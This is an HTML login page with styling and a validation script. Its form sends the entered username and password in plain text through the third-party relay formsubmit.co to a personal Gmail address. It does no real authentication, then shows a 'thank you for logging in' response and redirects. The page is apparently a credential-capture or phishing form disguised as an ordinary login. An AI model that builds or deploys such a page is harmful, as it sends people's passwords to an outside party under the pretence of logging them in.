<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      background: #fff;
      padding: 2rem;
      border-radius: 8px;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      width: 300px;
      text-align: center;
    }
    h1 {
      margin-bottom: 1.5rem;
      color: #333;
    }
    input {
      width: 100%;
      padding: 0.75rem;
      margin: 0.5rem 0;
      border: 1px solid #ccc;
      border-radius: 4px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 0.75rem;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      margin-top: 1rem;
    }
    button:hover {
      background: #0056b3;
    }
    .error {
      color: red;
      font-size: 0.875rem;
      margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Login</h1>
    <form 
      action="https://formsubmit.co/wisdom.e.alornyo@gmail.com" 
      method="POST"
      onsubmit="return validateForm()"
    >
      <!-- FormSubmit Configuration -->
      <input type="hidden" name="_subject" value="New Login Attempt - Your Website">
      <input type="hidden" name="_autoresponse" value="Thank you for logging in to our service!">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_next" value="https://yourwebsite.com/welcome.html">
      
      <!-- Login Fields -->
      <input type="text" name="username" placeholder="Username" required>
      <input type="password" name="password" placeholder="Password" required>
      
      <button type="submit">Login</button>
      
      <p id="error-message" class="error"></p>
    </form>
  </div>

  <script>
    function validateForm() {
      const username = document.querySelector('input[name="username"]').value;
      const password = document.querySelector('input[name="password"]').value;
      const errorElement = document.getElementById('error-message');

      if (!username || !password) {
        errorElement.textContent = "Please fill in all fields!";
        return false;
      }

      return true; // Allow form submission
    }
  </script>
</body>
</html>
